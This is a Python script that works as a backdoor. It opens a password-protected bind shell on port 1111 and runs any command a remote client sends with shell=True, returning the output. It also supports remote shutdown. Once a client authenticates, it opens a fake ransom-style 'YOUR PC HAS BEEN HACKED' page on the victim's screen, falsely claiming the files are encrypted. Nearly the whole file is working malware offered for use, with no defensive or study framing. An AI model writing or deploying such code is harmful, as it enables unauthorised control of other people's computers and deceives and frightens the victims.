import os
import platform
import socket
import subprocess
import webbrowser

# Configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 1111
PASSWORD = "Nit1111"  # Set a strong password

def execute_command(command):
    """Execute a command and return the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except Exception as e:
        return str(e)

def show_fake_message():
    """Display a fake 'hacked' message to the victim."""
    message = """
    <html>
    <body style="background-color: black; color: red; text-align: center; font-family: Arial, sans-serif;">
        <h1 style="font-size: 48px;">YOUR PC HAS BEEN HACKED!</h1>
        <p style="font-size: 24px;">All your files are now encrypted. Do not attempt to restart your computer.</p>
        <p style="font-size: 18px;">Contact us at: hacker@darkweb.com</p>
    </body>
    </html>
    """
    with open("hacked.html", "w") as file:
        file.write(message)
    webbrowser.open("hacked.html")

def start_server():
    """Start the server and listen for connections."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"[*] Listening for connections on {HOST}:{PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection established with {client_address}")

        try:
            # Request password
            client_socket.send("Password:".encode('utf-8'))
            password = client_socket.recv(1024).decode('utf-8').strip()

            print(f"[*] Received password: {password}")  # Debug statement

            if password == PASSWORD:
                client_socket.send("Authenticated".encode('utf-8'))  # Fixed typo here
                print(f"[+] Client {client_address} authenticated.")

                # Show fake message to the victim
                show_fake_message()

                while True:
                    # Receive command from client
                    command = client_socket.recv(1024).decode('utf-8').strip()
                    if not command:
                        break

                    print(f"[*] Received command: {command}")

                    if command.lower() == "shutdown":
                        print("[!] Shutting down the system...")
                        if platform.system().lower() == "windows":
                            os.system("shutdown /s /t 1")
                        else:
                            os.system("sudo shutdown -h now")
                        break
                    elif command.lower() == "exit":
                        print("[!] Closing connection...")
                        break
                    else:
                        # Execute the command and send the output back to the client
                        output = execute_command(command)
                        client_socket.send(output.encode('utf-8'))
            else:
                print("[-] Invalid password.")
                client_socket.send("Authentication failed. Connection closed.".encode('utf-8'))
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            client_socket.close()
            print(f"[*] Connection with {client_address} closed.")

if __name__ == "__main__":
    start_server()